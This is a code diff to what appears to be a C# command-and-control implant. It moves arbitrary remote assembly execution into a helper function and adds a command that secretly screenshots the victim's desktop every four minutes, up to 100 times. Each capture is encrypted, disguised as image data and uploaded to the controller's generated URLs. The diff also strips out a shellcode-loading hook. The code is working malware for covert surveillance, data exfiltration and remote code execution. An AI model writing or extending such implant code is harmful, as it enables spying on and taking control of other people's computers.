@@ -22,8 +22,6 @@ public class Program
 	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 	public const int SW_HIDE = 0;
 	public const int SW_SHOW = 5;
-	public static string scode = "";
-	public static string proc = @"c:\windows\system32\netsh.exe";
 
 	public static void Sharp()
 	{
@@ -227,6 +225,57 @@ public class Program
 		   }, null, true);
 	}
 	
+	static string RunAssembly(string c)
+	{
+		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+		int i = 0;
+		string sOut = null;
+		string method = "", splittheseargs = "", qualifiedname = "", name = "";
+		foreach (var a in splitargs)
+		{
+			if (i == 1)
+				qualifiedname = a;
+			if (i == 2)
+				name = a;
+
+			if (c.ToLower().StartsWith("run-exe"))
+				if (i > 2)
+					splittheseargs = splittheseargs + " " + a;
+				else
+				if (i == 3)
+					method = a;
+				else if (i > 3)
+					splittheseargs = splittheseargs + " " + a;
+			i++;
+		}
+		var splitnewargs = splittheseargs.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+		foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
+		{
+			if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
+			{
+				var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
+				try
+				{
+					if (c.ToLower().StartsWith("run-exe"))
+						sOut = loadedType.Assembly.EntryPoint.Invoke(null, new object[] { splitnewargs }).ToString();
+					else
+					{
+						try
+						{
+							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { splitnewargs }).ToString();
+						}
+						catch
+						{
+							sOut = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
+						}
+					}
+				}
+				catch { }
+			}
+		}
+		return sOut;
+	}
+	
 	internal static class UrlGen
 	{
 		static List<String> _stringnewURLS = new List<String>();
@@ -239,7 +288,6 @@ public class Program
 			_stringnewURLS = _re.Matches(stringURLS.Replace(",", "").Replace(" ", "")).Cast<Match>().Select(m => m.Value).Where(m => !string.IsNullOrEmpty(m)).ToList();
 			_randomURI = RandomURI;
 			_baseUrl = baseUrl;
-	
 		}
 	
 		internal static String GenerateUrl()
@@ -356,6 +404,28 @@ public class Program
 							var dsendBytes = ImgGen.GetImgData(doutputBytes);
 							GetWebRequest(dtask).UploadData(UrlGen.GenerateUrl(), dsendBytes);
 						}
+						else if (c.ToLower().StartsWith("get-screenshotmulti"))
+						{
+							bool sShot = true;
+							int sShotCount = 1;
+							while(sShot) {
+								var sHot = RunAssembly("run-exe Core.Program Core get-screenshot");
+								var dtask = Encryption(Key, c);
+								var dcoutput = Encryption(Key, strOutput.ToString(), true);
+								var doutputBytes = System.Convert.FromBase64String(dcoutput);
+								var dsendBytes = ImgGen.GetImgData(doutputBytes);
+								GetWebRequest(dtask).UploadData(UrlGen.GenerateUrl(), dsendBytes);
+								Thread.Sleep(240000);
+								sShotCount++;
+								if (sShotCount > 100) {
+									sShot = false;
+									tasksrc = "Finished Multi";
+									var sbc = strOutput.GetStringBuilder();
+									sbc.Remove(0, sbc.Length);
+									output.Append("[+] Multi Screenshot Ran Sucessfully");
+								}
+							}
+						}
 						else if (c.ToLower().StartsWith("listmodules"))
 						{
 							var appd = AppDomain.CurrentDomain.GetAssemblies();
@@ -363,56 +433,9 @@ public class Program
 							foreach (var ass in appd)
 								output.AppendLine(ass.FullName.ToString());
 						}
-						else if (c.ToLower().StartsWith("$shellcode"))
-							scode = c.Substring(13, c.Length - 13).Replace("\"", "");
-	
 						else if (c.ToLower().StartsWith("run-dll") || c.ToLower().StartsWith("run-exe"))
 						{
-							var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
-							int i = 0;
-							string method = "", splittheseargs = "", qualifiedname = "", name = "";
-							foreach (var a in splitargs)
-							{
-								if (i == 1)
-									qualifiedname = a;
-								if (i == 2)
-									name = a;
-	
-								if (c.ToLower().StartsWith("run-exe"))
-									if (i > 2)
-										splittheseargs = splittheseargs + " " + a;
-									else
-									if (i == 3)
-										method = a;
-									else if (i > 3)
-										splittheseargs = splittheseargs + " " + a;
-								i++;
-							}
-							var splitnewargs = splittheseargs.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
-							foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
-							{
-								if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
-								{
-									var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
-									try
-									{
-										if (c.ToLower().StartsWith("run-exe"))
-											output.AppendLine(loadedType.Assembly.EntryPoint.Invoke(null, new object[] { splitnewargs }).ToString());
-										else
-										{
-											try
-											{
-												output.AppendLine(loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, new object[] { splitnewargs }).ToString());
-											}
-											catch
-											{
-												output.AppendLine(loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString());
-											}
-										}
-									}
-									catch { }
-								}
-							}
+							output.AppendLine(RunAssembly(c));
 						}
 						else if (c.ToLower().StartsWith("start-process"))
 						{
